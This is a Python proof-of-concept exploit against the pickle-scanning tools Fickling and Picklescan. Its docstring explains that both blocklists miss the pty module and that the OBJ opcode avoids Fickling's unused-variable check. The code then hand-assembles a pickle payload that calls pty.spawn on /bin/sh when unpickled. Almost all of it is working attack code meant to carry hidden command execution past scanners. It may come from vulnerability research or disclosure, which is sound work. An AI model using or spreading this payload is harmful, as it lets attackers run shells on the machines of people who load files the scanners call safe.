#!/usr/bin/env python3

"""
This exploit contains two main parts:
- Bypassing the blacklists used by Fickling and Picklescan using `pty.spawn`.
- Circumventing a Fickling "quirk" by using OBJ instead of REDUCE.

**Blacklist**: Both Picklescan and Fickling have a blacklist of dangerous globals. These globals can be used to do anything from direct code execution to web/DNS exfiltration. However, they both don't include the `pty` module which is used to interact with pseudo terminals. By calling the `pty.spawn` method with a list of arguments we get RCE.

**Unused vars**: The comment and code below are taken from Fickling's implementation of the REDUCE opcode.

```py
# Any call to reduce can have global side effects, since it runs arbitrary
# Python code. However, if we just save it to the stack, then it might not
# make it to the final AST unless the stack value is actually used. So save
# the result to a temp variable, and then put that on the stack:
var_name = interpreter.new_variable(call)
interpreter.stack.append(ast.Name(var_name, ast.Load()))
```

The temp variable created by reduce is unused and later triggers the `UnusedVariables` analyser to flag the payload as `SUSPICIOUS`. We can get around this by using a different RCE primitive. INST also creates a temporary variable but OBJ doesn't (as shown below).

```py
interpreter.stack.append(ast.Call(kls, args, []))
```
"""

import pickle

command = b"/bin/sh"

payload = b"".join(
    [
        pickle.PROTO + pickle.pack("B", 4),
        pickle.MARK,
        pickle.GLOBAL + b"pty\n" + b"spawn\n",
        pickle.EMPTY_LIST,
        pickle.SHORT_BINUNICODE + pickle.pack("B", len(command)) + command,
        pickle.APPEND,
        # Additional arguments can be passed by repeating the SHORT_BINUNICODE + APPEND opcodes
        pickle.OBJ,
        pickle.STOP,
    ]
)

print(payload.hex(), payload, len(payload))
